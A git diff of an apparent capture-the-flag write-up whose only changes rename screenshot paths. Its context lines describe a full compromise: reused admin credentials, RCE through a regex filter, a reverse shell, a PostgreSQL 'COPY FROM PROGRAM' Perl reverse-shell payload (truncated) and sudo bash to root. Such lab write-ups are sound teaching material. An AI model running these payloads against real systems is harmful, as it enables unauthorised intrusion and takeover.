@@ -65,7 +65,7 @@ database/seeds/DatabaseSeeder.php:            'password' => 'SplodgeSplodgeSplod
 
 Port 80 just showed us a 403 page, which was not helpful. Port 1337 did show some potential for RCE:
 
-<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (72) (8).png" alt=""><figcaption></figcaption></figure>
 
 However, I was unable to make anything happen. Port 8080 showed a blog page with an admin login:
 
@@ -73,7 +73,7 @@ However, I was unable to make anything happen. Port 8080 showed a blog page with
 
 We can login to the admin panel using `admin:SplodgeSplodgeSplodge`:
 
-<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44) (1).png" alt=""><figcaption></figcaption></figure>
 
 So now we know that the Git repository is for this application. This panel was rather interesting, because it has a 'Profanity Filter Regex' option, which I presume allows us to specify Regex strings within it.&#x20;
 
@@ -111,7 +111,7 @@ Afterwards, I sent one comment with the letter 'a' in it. When I did, I got a hi
 
 We now have RCE over the machine, and we can easily get a reverse shell on port 8080:
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -199,7 +199,7 @@ COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (33) (5).png" alt=""><figcaption></figcaption></figure>
 
 The payload is taken from Hacktricks.
 
@@ -207,4 +207,4 @@ The payload is taken from Hacktricks.
 
 User can run `bash` as `root`:
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>
